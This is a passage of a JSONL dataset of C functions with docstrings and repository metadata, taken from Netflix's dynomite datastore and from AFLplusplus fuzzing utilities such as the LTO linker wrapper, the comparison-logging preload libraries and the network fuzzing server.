{"docstring": "//-----------------------------------------------------------------------------\n// Finalization mix - force all bits of a hash block to avalanche\n", "func_signal": "static inline FORCE_INLINE uint32_t fmix32 ( uint32_t h )", "code": "{\n  h ^= h >> 16;\n  h *= 0x85ebca6b;\n  h ^= h >> 13;\n  h *= 0xc2b2ae35;\n  h ^= h >> 16;\n\n  return h;\n}", "path": "dynomite/contrib/murmur3/murmur3.c", "commit_date": "2013-12-16 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Initialize logging including log level and output target. Logging output may\n * be sent to standard error or to a log file.\n * @param[in] level Log level.\n * @param[in] name Full path to the log file.\n * @return\n */\n", "func_signal": "int log_init(int level, char *name)", "code": "{\n  struct logger *l = &logger;\n\n  l->level = MAX(LOG_EMERG, MIN(level, LOG_PVERB));\n  l->name = name;\n  if (name == NULL || !strlen(name)) {\n    l->fd = STDERR_FILENO;\n  } else {\n    l->fd = open(name, O_WRONLY | O_APPEND | O_CREAT, 0644);\n    if (l->fd < 0) {\n      log_stderr(\"opening log file '%s' failed: %s\", name, strerror(errno));\n      return -1;\n    }\n  }\n\n  return 0;\n}", "path": "dynomite/src/dyn_log.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Process elements in the circular buffer.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "static rstatus_t core_process_messages(void)", "code": "{\n  log_debug(LOG_VVVERB, \"length of C2G_OutQ : %d\", CBUF_Len(C2G_OutQ));\n\n  // Continue to process messages while the circular buffer is not empty\n  while (!CBUF_IsEmpty(C2G_OutQ)) {\n    // Get an element from the beginning of the circular buffer\n    struct ring_msg *ring_msg = (struct ring_msg *)CBUF_Pop(C2G_OutQ);\n    if (ring_msg != NULL && ring_msg->cb != NULL) {\n      // CBUF_Push\n      // ./src/dyn_dnode_msg.c\n      // ./src/dyn_gossip.c\n      ring_msg->cb(ring_msg);\n      core_debug(ring_msg->sp->ctx);\n      ring_msg_deinit(ring_msg);\n    }\n  }\n\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/*\n * Hexadecimal dump in the canonical hex + ascii display\n * See -C option in man hexdump\n */\n", "func_signal": "void _log_hexdump(const char *file, int line, char *data, int datalen,\n                  const char *fmt, ...)", "code": "{\n  struct logger *l = &logger;\n  char buf[8 * LOG_MAX_LEN];\n  int i, off, len, size, errno_save;\n  ssize_t n;\n\n  if (l->fd < 0) {\n    return;\n  }\n\n  /* log hexdump */\n  errno_save = errno;\n  off = 0;                /* data offset */\n  len = 0;                /* length of output buffer */\n  size = 8 * LOG_MAX_LEN; /* size of output buffer */\n\n  while (datalen != 0 && (len < size - 1)) {\n    char *save, *str;\n    unsigned char c;\n    int savelen;\n\n    len += dn_scnprintf(buf + len, size - len, \"%08x  \", off);\n\n    save = data;\n    savelen = datalen;\n\n    for (i = 0; datalen != 0 && i < 16; data++, datalen--, i++) {\n      c = (unsigned char)(*data);\n      str = (i == 7) ? \"  \" : \" \";\n      len += dn_scnprintf(buf + len, size - len, \"%02x%s\", c, str);\n    }\n    for (; i < 16; i++) {\n      str = (i == 7) ? \"  \" : \" \";\n      len += dn_scnprintf(buf + len, size - len, \"  %s\", str);\n    }\n\n    data = save;\n    datalen = savelen;\n\n    len += dn_scnprintf(buf + len, size - len, \"  |\");\n\n    for (i = 0; datalen != 0 && i < 16; data++, datalen--, i++) {\n      c = (unsigned char)(isprint(*data) ? *data : '.');\n      len += dn_scnprintf(buf + len, size - len, \"%c\", c);\n    }\n    len += dn_scnprintf(buf + len, size - len, \"|\\n\");\n\n    off += 16;\n  }\n\n  n = dn_write(l->fd, buf, len);\n  if (n < 0) {\n    l->nerror++;\n  }\n\n  errno = errno_save;\n}", "path": "dynomite/src/dyn_log.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "// TODO: Does this belong here?\n", "func_signal": "bool is_read_repairs_enabled()", "code": "{\n  return g_read_repairs_enabled &&\n        (g_read_consistency > DC_ONE) &&\n        (g_write_consistency > DC_ONE);\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Initialize memory buffers, message queue, and connections.\n * @param[in] nci Dynomite instance.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "rstatus_t core_start(struct instance *nci)", "code": "{\n  conn_init();\n  task_mgr_init();\n\n  rstatus_t status = core_ctx_create(nci);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  struct context *ctx = nci->ctx;\n  ASSERT(ctx != NULL);\n\n  status = core_server_pool_init(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_crypto_init(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_stats_create(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_event_base_create(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_server_pool_preconnect(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_proxy_init(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_dnode_proxy_init(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_dnode_peer_init(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_dnode_peer_pool_preconnect(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n\n  status = core_init_last(ctx);\n  if (status != DN_OK) {\n    goto error;\n  }\n  // XXX: Gossip is currently not maintained actively, so ignore any failures.\n  IGNORE_RET_VAL(core_gossip_pool_init(ctx));\n\n  // Set the repairs flag.\n  g_read_repairs_enabled = ctx->cf->pool.read_repairs_enabled;\n\n  /**\n   * Providing mbuf_size and alloc_msgs through the command line\n   * has been deprecated. For backward compatibility\n   * we support both ways here: One through nci (command line)\n   * and one through the YAML file (server_pool).\n   */\n  struct server_pool *sp = &ctx->pool;\n\n  if (sp->mbuf_size == UNSET_NUM) {\n    loga(\"mbuf_size not in YAML: using deprecated way  %d\",\n         nci->mbuf_chunk_size);\n    mbuf_init(nci->mbuf_chunk_size);\n  } else {\n    loga(\"YAML provided mbuf_size: %d\", sp->mbuf_size);\n    mbuf_init(sp->mbuf_size);\n  }\n  if (sp->alloc_msgs_max == UNSET_NUM) {\n    loga(\"max_msgs not in YAML: using deprecated way %d\", nci->alloc_msgs_max);\n    msg_init(nci->alloc_msgs_max);\n  } else {\n    loga(\"YAML provided max_msgs: %d\", sp->alloc_msgs_max);\n    msg_init(sp->alloc_msgs_max);\n  }\n\n  return DN_OK;\n\nerror:\n  // If we hit an error, undo everything in the reverse order as it was setup to maintain\n  // symmetric setup/teardown semantics.\n  if (ctx != NULL) {\n    //gossip_pool_deinit(ctx);   // XXX: Gossip not actively maintained.\n    dnode_peer_pool_disconnect(ctx);\n    dnode_peer_deinit(&ctx->pool.peers);\n    dnode_proxy_deinit(ctx);\n    proxy_deinit(ctx);\n    server_pool_disconnect(ctx);\n    if (ctx->evb) event_base_destroy(ctx->evb);\n    if (ctx->entropy) entropy_conn_destroy(ctx->entropy);\n    if (ctx->stats) stats_destroy(ctx->stats);\n    crypto_deinit();\n    server_pool_deinit(&ctx->pool);\n    if (ctx->cf) conf_destroy(ctx->cf);\n    dn_free(ctx);\n  }\n  conn_deinit();\n  return status;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/*\n * CRC-32 implementation compatible with libmemcached library. Unfortunately\n * this implementation does not return CRC-32 as per spec.\n */\n", "func_signal": "rstatus_t hash_crc32(const unsigned char *key, size_t key_length,\n                     struct dyn_token *token)", "code": "{\n  uint64_t x;\n  uint32_t crc = UINT32_MAX;\n\n  for (x = 0; x < key_length; x++) {\n    crc = (crc >> 8) ^ crc32tab[(crc ^ (uint64_t)key[x]) & 0xff];\n  }\n\n  uint32_t val = ((~crc) >> 16) & 0x7fff;\n  size_dyn_token(token, 1);\n  set_int_dyn_token(token, val);\n\n  return DN_OK;\n}", "path": "dynomite/src/hashkit/dyn_crc32.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "// Similar to strcmp() but compares 2 'dyn_token' structs instead.\n", "func_signal": "static int vnode_item_cmp(const void *t1, const void *t2)", "code": "{\n  const struct continuum *ct1 = t1, *ct2 = t2;\n\n  return cmp_dyn_token(ct1->token, ct2->token);\n}", "path": "dynomite/src/dyn_vnode.c", "commit_date": "2019-08-27 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Close the logging file descriptor.\n */\n", "func_signal": "void log_deinit(void)", "code": "{\n  struct logger *l = &logger;\n\n  if (l->fd < 0 || l->fd == STDERR_FILENO) {\n    return;\n  }\n\n  close(l->fd);\n}", "path": "dynomite/src/dyn_log.c", "commit_date": "2018-09-13 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Deinitialize the server pool which includes deinitialization of the backend\n * data store and setting the number of live backend servers to 0.\n * @param[in,out] sp Server pool.\n */\n", "func_signal": "void server_pool_deinit(struct server_pool *sp)", "code": "{\n  ASSERT(sp->p_conn == NULL);\n  ASSERT(TAILQ_EMPTY(&sp->c_conn_q));\n\n  server_deinit(sp->datastore);\n  dn_free(sp->datastore);\n  sp->datastore = NULL;\n  log_debug(LOG_DEBUG, \"deinit pool '%.*s'\", sp->name.len, sp->name.data);\n}", "path": "dynomite/src/dyn_server.c", "commit_date": "2019-10-22 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/**\n * Create the Dynomite server performance statistics and assign it to the\n * context, plus initialize anti-entropy.\n * @param[in,out] ctx Context.\n * @return rstatus_t Return status code.\n */\n", "func_signal": "static rstatus_t core_stats_create(struct context *ctx)", "code": "{\n  struct instance *nci = ctx->instance;\n  struct server_pool *sp = &ctx->pool;\n\n  ctx->stats = stats_create(sp->stats_endpoint.port, sp->stats_endpoint.pname,\n                            sp->stats_interval, nci->hostname, &ctx->pool, ctx);\n  if (ctx->stats == NULL) {\n    log_error(\"Failed to create stats!!!\");\n    return DN_ERROR;\n  }\n\n  return DN_OK;\n}", "path": "dynomite/src/dyn_core.c", "commit_date": "2019-10-30 00:00:00", "repo_name": "Netflix/dynomite", "stars": 4152, "license": "apache-2.0", "language": "c", "size": 8887}
{"docstring": "/* Main entry point */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n\n  s32  pid, i, status;\n  u8 * ptr;\n  char thecwd[PATH_MAX];\n\n  if ((ptr = getenv(\"AFL_LD_CALLER\")) != NULL) {\n\n    FATAL(\"ld loop detected! Set AFL_REAL_LD!\\n\");\n\n  }\n\n  if (isatty(2) && !getenv(\"AFL_QUIET\") && !getenv(\"AFL_DEBUG\")) {\n\n    SAYF(cCYA \"afl-ld-to\" VERSION cRST\n              \" by Marc \\\"vanHauser\\\" Heuse <mh@mh-sec.de>\\n\");\n\n  } else\n\n    be_quiet = 1;\n\n  if (getenv(\"AFL_DEBUG\") != NULL) debug = 1;\n  if (getenv(\"AFL_PATH\") != NULL) afl_path = getenv(\"AFL_PATH\");\n  if (getenv(\"AFL_LD_PASSTHROUGH\") != NULL) passthrough = 1;\n  if (getenv(\"AFL_REAL_LD\") != NULL) real_ld = getenv(\"AFL_REAL_LD\");\n\n  if (!afl_path || !*afl_path) afl_path = \"/usr/local/lib/afl\";\n\n  setenv(\"AFL_LD_CALLER\", \"1\", 1);\n\n  if (debug) {\n\n    if (getcwd(thecwd, sizeof(thecwd)) != 0) strcpy(thecwd, \".\");\n\n    DEBUGF(\"cd \\\"%s\\\";\", thecwd);\n    for (i = 0; i < argc; i++)\n      SAYF(\" \\\"%s\\\"\", argv[i]);\n    SAYF(\"\\n\");\n\n  }\n\n  if (argc < 2) {\n\n    SAYF(\n        \"\\n\"\n        \"This is a helper application for afl-clang-lto. It is a wrapper \"\n        \"around GNU \"\n        \"llvm's 'lld',\\n\"\n        \"executed by the toolchain whenever using \"\n        \"afl-clang-lto/afl-clang-lto++.\\n\"\n        \"You probably don't want to run this program directly but rather pass \"\n        \"it as LD parameter to configure scripts\\n\\n\"\n\n        \"Environment variables:\\n\"\n        \"  AFL_LD_PASSTHROUGH   do not link+optimize == no instrumentation\\n\"\n        \"  AFL_REAL_LD          point to the real llvm 11 lld if necessary\\n\"\n\n        \"\\nafl-ld-to was compiled with the fixed real 'ld' of %s and the \"\n        \"binary path of %s\\n\\n\",\n        real_ld, LLVM_BINDIR);\n\n    exit(1);\n\n  }\n\n  edit_params(argc, argv);  // here most of the magic happens :-)\n\n  if (debug) {\n\n    DEBUGF(\"cd \\\"%s\\\";\", thecwd);\n    for (i = 0; i < ld_param_cnt; i++)\n      SAYF(\" \\\"%s\\\"\", ld_params[i]);\n    SAYF(\"\\n\");\n\n  }\n\n  if (!(pid = fork())) {\n\n    if (strlen(real_ld) > 1) execvp(real_ld, (char **)ld_params);\n    execvp(\"ld\", (char **)ld_params);  // fallback\n    FATAL(\"Oops, failed to execute 'ld' - check your PATH\");\n\n  }\n\n  if (pid < 0) PFATAL(\"fork() failed\");\n\n  if (waitpid(pid, &status, 0) <= 0) PFATAL(\"waitpid() failed\");\n  if (debug) DEBUGF(\"linker result: %d\\n\", status);\n\n  if (!just_version) {\n\n    if (status == 0) {\n\n      if (!be_quiet) OKF(\"Linker was successful\");\n\n    } else {\n\n      SAYF(cLRD \"[-] \" cRST\n                \"Linker failed, please investigate and send a bug report. Most \"\n                \"likely an 'ld' option is incompatible with %s.\\n\",\n           AFL_CLANG_FLTO);\n\n    }\n\n  }\n\n  exit(WEXITSTATUS(status));\n\n}", "path": "AFLplusplus/src/afl-ld-lto.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Identify the binary boundaries in the memory mapping */\n", "func_signal": "static void __compcov_load(void)", "code": "{\n\n  __libc_strcmp = dlsym(RTLD_NEXT, \"strcmp\");\n  __libc_strncmp = dlsym(RTLD_NEXT, \"strncmp\");\n  __libc_strcasecmp = dlsym(RTLD_NEXT, \"strcasecmp\");\n  __libc_strncasecmp = dlsym(RTLD_NEXT, \"strncasecmp\");\n  __libc_memcmp = dlsym(RTLD_NEXT, \"memcmp\");\n\n  if (getenv(\"AFL_QEMU_COMPCOV\")) { __compcov_level = 1; }\n  if (getenv(\"AFL_COMPCOV_LEVEL\")) {\n\n    __compcov_level = atoi(getenv(\"AFL_COMPCOV_LEVEL\"));\n\n  }\n\n  char *id_str = getenv(SHM_ENV_VAR);\n  int   shm_id;\n\n  if (id_str) {\n\n    shm_id = atoi(id_str);\n    __compcov_afl_map = shmat(shm_id, NULL, 0);\n\n    if (__compcov_afl_map == (void *)-1) exit(1);\n\n  } else {\n\n    __compcov_afl_map = calloc(1, MAP_SIZE);\n\n  }\n\n  if (getenv(\"AFL_INST_LIBS\")) {\n\n    __compcov_code_start = (void *)0;\n    __compcov_code_end = (void *)-1;\n    return;\n\n  }\n\n  char *bin_name = getenv(\"AFL_COMPCOV_BINNAME\");\n\n  procmaps_iterator *maps = pmparser_parse(-1);\n  procmaps_struct *  maps_tmp = NULL;\n\n  while ((maps_tmp = pmparser_next(maps)) != NULL) {\n\n    /* If AFL_COMPCOV_BINNAME is not set pick the first executable segment */\n    if (!bin_name || strstr(maps_tmp->pathname, bin_name) != NULL) {\n\n      if (maps_tmp->is_x) {\n\n        if (!__compcov_code_start) __compcov_code_start = maps_tmp->addr_start;\n        if (!__compcov_code_end) __compcov_code_end = maps_tmp->addr_end;\n\n      }\n\n    }\n\n    if ((maps_tmp->is_w && !maps_tmp->is_r) || __compcov_ro_cnt == MAX_MAPPINGS)\n      continue;\n\n    __compcov_ro[__compcov_ro_cnt].st = maps_tmp->addr_start;\n    __compcov_ro[__compcov_ro_cnt].en = maps_tmp->addr_end;\n    ++__compcov_ro_cnt;\n\n  }\n\n  pmparser_free(maps);\n\n}", "path": "AFLplusplus/qemu_mode/libcompcov/libcompcov.so.c", "commit_date": "2020-05-12 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Display usage hints. */\n", "func_signal": "static void usage(u8 *argv0)", "code": "{\n\n  SAYF(\n      \"\\n%s [ options ] -- /path/to/target_app [ ... ]\\n\\n\"\n\n      \"Required parameters:\\n\"\n\n      \"  -i port       - the port to listen for the client to connect to\\n\\n\"\n\n      \"Execution control settings:\\n\"\n\n      \"  -f file       - input file read by the tested program (stdin)\\n\"\n      \"  -t msec       - timeout for each run (%d ms)\\n\"\n      \"  -m megs       - memory limit for child process (%d MB)\\n\"\n      \"  -Q            - use binary-only instrumentation (QEMU mode)\\n\"\n      \"  -U            - use unicorn-based instrumentation (Unicorn mode)\\n\"\n      \"  -W            - use qemu-based instrumentation with Wine (Wine \"\n      \"mode)\\n\\n\"\n\n      \"Environment variables used:\\n\"\n      \"TMPDIR: directory to use for temporary input files\\n\"\n      \"ASAN_OPTIONS: custom settings for ASAN\\n\"\n      \"              (must contain abort_on_error=1 and symbolize=0)\\n\"\n      \"MSAN_OPTIONS: custom settings for MSAN\\n\"\n      \"              (must contain exitcode=\"STRINGIFY(MSAN_ERROR)\" and symbolize=0)\\n\"\n      \"AFL_MAP_SIZE: the shared memory size for that target. must be >= the size\\n\"\n      \"              the target was compiled for\\n\"\n      \"AFL_PRELOAD:  LD_PRELOAD / DYLD_INSERT_LIBRARIES settings for target\\n\"\n\n      , argv0, EXEC_TIMEOUT, MEM_LIMIT);\n\n  exit(1);\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Place the input at the right spot inside unicorn */\n", "func_signal": "static bool place_input_callback(\n    uc_engine *uc, \n    char *input, \n    size_t input_len, \n    uint32_t persistent_round, \n    void *data\n)", "code": "{\n    // printf(\"Placing input with len %ld to %x\\n\", input_len, DATA_ADDRESS);\n    if (input_len < 1 || input_len >= INPUT_SIZE_MAX - INPUT_OFFSET) {\n        // Test input too short or too long, ignore this testcase\n        return false;\n    }\n\n    // We need a valid c string, make sure it never goes out of bounds.\n    input[input_len-1] = '\\0';\n    // Write the testcase to unicorn.\n    uc_mem_write(uc, INPUT_LOCATION + INPUT_OFFSET, input, input_len);\n\n    // store input_len for the faux strlen hook\n    current_input_len = input_len;\n\n    return true;\n}", "path": "AFLplusplus/unicorn_mode/samples/c/harness.c", "commit_date": "2020-06-02 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Init code to open the output file (or default to stderr). */\n", "func_signal": "__attribute__((constructor)) void __tokencap_init(void)", "code": "{\n\n  u8 *fn = getenv(\"AFL_TOKEN_FILE\");\n  if (fn) __tokencap_out_file = open(fn, O_RDWR | O_CREAT | O_APPEND, 0655);\n  if (__tokencap_out_file == -1) __tokencap_out_file = STDERR_FILENO;\n  __tokencap_pid = getpid();\n\n#ifdef RTLD_NEXT\n  __libc_strcmp = dlsym(RTLD_NEXT, \"strcmp\");\n  __libc_strncmp = dlsym(RTLD_NEXT, \"strncmp\");\n  __libc_strcasecmp = dlsym(RTLD_NEXT, \"strcasecmp\");\n  __libc_strncasecmp = dlsym(RTLD_NEXT, \"strncasecmp\");\n  __libc_memcmp = dlsym(RTLD_NEXT, \"memcmp\");\n  __libc_bcmp = dlsym(RTLD_NEXT, \"bcmp\");\n  __libc_strstr = dlsym(RTLD_NEXT, \"strstr\");\n  __libc_strcasestr = dlsym(RTLD_NEXT, \"strcasestr\");\n  __libc_memmem = dlsym(RTLD_NEXT, \"memmem\");\n#endif\n\n}", "path": "AFLplusplus/utils/libtokencap/libtokencap.so.c", "commit_date": "2020-12-09 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Write output file. */\n", "func_signal": "static s32 write_to_file(u8 *path, u8 *mem, u32 len)", "code": "{\n\n  s32 ret;\n\n  unlink(path);                                            /* Ignore errors */\n\n  ret = open(path, O_RDWR | O_CREAT | O_EXCL, 0600);\n\n  if (ret < 0) { PFATAL(\"Unable to create '%s'\", path); }\n\n  ck_write(ret, mem, len, path);\n\n  lseek(ret, 0, SEEK_SET);\n\n  return ret;\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Check an address against the list of read-only mappings. */\n", "func_signal": "static u8 __tokencap_is_ro(const void *ptr)", "code": "{\n\n  u32 i;\n\n  if (!__tokencap_ro_loaded) __tokencap_load_mappings();\n\n  for (i = 0; i < __tokencap_ro_cnt; i++)\n    if (ptr >= __tokencap_ro[i].st && ptr <= __tokencap_ro[i].en) return 1;\n\n  return 0;\n\n}", "path": "AFLplusplus/utils/libtokencap/libtokencap.so.c", "commit_date": "2020-12-09 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Examine and modify parameters to pass to 'ld', 'llvm-link' and 'llmv-ar'.\n   Note that the file name is always the last parameter passed by GCC,\n   so we exploit this property to keep the code \"simple\". */\n", "func_signal": "static void edit_params(int argc, char **argv)", "code": "{\n\n  u32 i, instrim = 0, gold_pos = 0, gold_present = 0, rt_present = 0,\n         rt_lto_present = 0, inst_present = 0;\n  char *ptr;\n\n  ld_params = ck_alloc(4096 * sizeof(u8 *));\n\n  ld_params[0] = (u8 *)real_ld;\n\n  if (!passthrough) {\n\n    for (i = 1; i < argc; i++) {\n\n      if (strstr(argv[i], \"/afl-llvm-rt-lto.o\") != NULL) rt_lto_present = 1;\n      if (strstr(argv[i], \"/afl-llvm-rt.o\") != NULL) rt_present = 1;\n      if (strstr(argv[i], \"/afl-llvm-lto-instr\") != NULL) inst_present = 1;\n\n    }\n\n    for (i = 1; i < argc && !gold_pos; i++) {\n\n      if (strcmp(argv[i], \"-plugin\") == 0) {\n\n        if (strncmp(argv[i], \"-plugin=\", strlen(\"-plugin=\")) == 0) {\n\n          if (strcasestr(argv[i], \"LLVMgold.so\") != NULL)\n            gold_present = gold_pos = i + 1;\n\n        } else if (i < argc && strcasestr(argv[i + 1], \"LLVMgold.so\") != NULL) {\n\n          gold_present = gold_pos = i + 2;\n\n        }\n\n      }\n\n    }\n\n    if (!gold_pos) {\n\n      for (i = 1; i + 1 < argc && !gold_pos; i++) {\n\n        if (argv[i][0] != '-') {\n\n          if (argv[i - 1][0] == '-') {\n\n            switch (argv[i - 1][1]) {\n\n              case 'b':\n                break;\n              case 'd':\n                break;\n              case 'e':\n                break;\n              case 'F':\n                break;\n              case 'f':\n                break;\n              case 'I':\n                break;\n              case 'l':\n                break;\n              case 'L':\n                break;\n              case 'm':\n                break;\n              case 'o':\n                break;\n              case 'O':\n                break;\n              case 'p':\n                if (index(argv[i - 1], '=') == NULL) gold_pos = i;\n                break;\n              case 'R':\n                break;\n              case 'T':\n                break;\n              case 'u':\n                break;\n              case 'y':\n                break;\n              case 'z':\n                break;\n              case '-': {\n\n                if (strcmp(argv[i - 1], \"--oformat\") == 0) break;\n                if (strcmp(argv[i - 1], \"--output\") == 0) break;\n                if (strncmp(argv[i - 1], \"--opt-remarks-\", 14) == 0) break;\n                gold_pos = i;\n                break;\n\n              }\n\n              default:\n                gold_pos = i;\n\n            }\n\n          } else\n\n            gold_pos = i;\n\n        }\n\n      }\n\n    }\n\n    if (!gold_pos) gold_pos = 1;\n\n  }\n\n  if (getenv(\"AFL_LLVM_INSTRIM\"))\n    instrim = 1;\n  else if ((ptr = getenv(\"AFL_LLVM_INSTRUMENT\")) &&\n           (strcasestr(ptr, \"CFG\") == 0 || strcasestr(ptr, \"INSTRIM\") == 0))\n    instrim = 1;\n\n  if (debug)\n    DEBUGF(\n        \"passthrough=%s instrim=%d, gold_pos=%d, gold_present=%s \"\n        \"inst_present=%s rt_present=%s rt_lto_present=%s\\n\",\n        passthrough ? \"true\" : \"false\", instrim, gold_pos,\n        gold_present ? \"true\" : \"false\", inst_present ? \"true\" : \"false\",\n        rt_present ? \"true\" : \"false\", rt_lto_present ? \"true\" : \"false\");\n\n  for (i = 1; i < argc; i++) {\n\n    if (ld_param_cnt >= MAX_PARAM_COUNT)\n      FATAL(\n          \"Too many command line parameters because of unpacking .a archives, \"\n          \"this would need to be done by hand ... sorry! :-(\");\n\n    if (strcmp(argv[i], \"--afl\") == 0) {\n\n      if (!be_quiet) OKF(\"afl++ test command line flag detected, exiting.\");\n      exit(0);\n\n    }\n\n    if (i == gold_pos && !passthrough) {\n\n      ld_params[ld_param_cnt++] = alloc_printf(\"-L%s/../lib\", LLVM_BINDIR);\n\n      if (!gold_present) {\n\n        ld_params[ld_param_cnt++] = \"-plugin\";\n        ld_params[ld_param_cnt++] =\n            alloc_printf(\"%s/../lib/LLVMgold.so\", LLVM_BINDIR);\n\n      }\n\n      ld_params[ld_param_cnt++] = \"--allow-multiple-definition\";\n\n      if (!inst_present) {\n\n        if (instrim)\n          ld_params[ld_param_cnt++] =\n              alloc_printf(\"-mllvm=-load=%s/afl-llvm-lto-instrim.so\", afl_path);\n        else\n          ld_params[ld_param_cnt++] = alloc_printf(\n              \"-mllvm=-load=%s/afl-llvm-lto-instrumentation.so\", afl_path);\n\n      }\n\n      if (!rt_present)\n        ld_params[ld_param_cnt++] = alloc_printf(\"%s/afl-llvm-rt.o\", afl_path);\n      if (!rt_lto_present)\n        ld_params[ld_param_cnt++] =\n            alloc_printf(\"%s/afl-llvm-rt-lto.o\", afl_path);\n\n    }\n\n    ld_params[ld_param_cnt++] = argv[i];\n\n  }\n\n  ld_params[ld_param_cnt] = NULL;\n\n}", "path": "AFLplusplus/src/afl-ld-lto.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Handle Ctrl-C and the like. */\n", "func_signal": "static void handle_stop_sig(int sig)", "code": "{\n\n  stop_soon = 1;\n  afl_fsrv_killall();\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/*\n * libXML wrappers\n */\n", "func_signal": "int xmlStrncmp(const char *s1, const char *s2, int len)", "code": "{\n\n  if (len <= 0) { return 0; }\n  if (s1 == s2) { return 0; }\n  if (s1 == NULL) { return -1; }\n  if (s2 == NULL) { return 1; }\n  return strncmp(s1, s2, (size_t)len);\n\n}", "path": "AFLplusplus/qemu_mode/libcompcov/libcompcov.so.c", "commit_date": "2020-05-12 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Do basic preparations - persistent fds, filenames, etc. */\n", "func_signal": "static void set_up_environment(afl_forkserver_t *fsrv)", "code": "{\n\n  u8 *x;\n\n  fsrv->dev_null_fd = open(\"/dev/null\", O_RDWR);\n  if (fsrv->dev_null_fd < 0) { PFATAL(\"Unable to open /dev/null\"); }\n\n  if (!out_file) {\n\n    u8 *use_dir = \".\";\n\n    if (access(use_dir, R_OK | W_OK | X_OK)) {\n\n      use_dir = get_afl_env(\"TMPDIR\");\n      if (!use_dir) { use_dir = \"/tmp\"; }\n\n    }\n\n    out_file = alloc_printf(\"%s/.afl-input-temp-%u\", use_dir, getpid());\n\n  }\n\n  unlink(out_file);\n\n  fsrv->out_fd = open(out_file, O_RDWR | O_CREAT | O_EXCL, 0600);\n\n  if (fsrv->out_fd < 0) { PFATAL(\"Unable to create '%s'\", out_file); }\n\n  /* Set sane defaults... */\n\n  x = get_afl_env(\"ASAN_OPTIONS\");\n\n  if (x) {\n\n    if (!strstr(x, \"abort_on_error=1\")) {\n\n      FATAL(\"Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!\");\n\n    }\n\n    if (!strstr(x, \"symbolize=0\")) {\n\n      FATAL(\"Custom ASAN_OPTIONS set without symbolize=0 - please fix!\");\n\n    }\n\n  }\n\n  x = get_afl_env(\"MSAN_OPTIONS\");\n\n  if (x) {\n\n    if (!strstr(x, \"exit_code=\" STRINGIFY(MSAN_ERROR))) {\n\n      FATAL(\"Custom MSAN_OPTIONS set without exit_code=\" STRINGIFY(\n          MSAN_ERROR) \" - please fix!\");\n\n    }\n\n    if (!strstr(x, \"symbolize=0\")) {\n\n      FATAL(\"Custom MSAN_OPTIONS set without symbolize=0 - please fix!\");\n\n    }\n\n  }\n\n  setenv(\"ASAN_OPTIONS\",\n         